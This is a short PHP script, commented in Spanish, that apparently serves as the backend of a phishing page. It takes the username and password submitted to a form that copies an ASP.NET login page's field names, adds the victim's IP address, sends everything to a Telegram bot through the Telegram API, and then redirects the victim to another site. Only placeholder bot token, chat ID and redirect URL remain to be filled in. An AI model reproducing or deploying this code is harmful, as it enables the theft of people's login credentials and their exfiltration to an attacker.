<?php
// Obtener los datos del formulario
$username = $_POST['ctl00$MainContent$ctl00$txtUserName']; // Nombre de usuario
$password = $_POST['ctl00$MainContent$ctl00$txtPassword']; // Contraseña

// Obtener la dirección IP del usuario
$user_ip = $_SERVER['REMOTE_ADDR'];

// Definir el token y el chat_id de Telegram
$bot_token = "TU_BOT_TOKEN"; // Reemplaza con tu token de Telegram
$chat_id = "TU_CHAT_ID"; // Reemplaza con el chat ID o tu ID de Telegram

// Componer el mensaje con la información del formulario y la IP
$message = "Nuevo ingreso:\n";
$message .= "Usuario: " . $username . "\n";
$message .= "Contraseña: " . $password . "\n";
$message .= "IP del usuario: " . $user_ip;

// URL para enviar el mensaje a Telegram
$telegram_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);

// Enviar el mensaje a Telegram
file_get_contents($telegram_url);

// Redirigir a otra página después de enviar el mensaje
header("Location: http://tupagina.com"); // Reemplaza con la URL de la página a la que deseas redirigir
exit();
?>
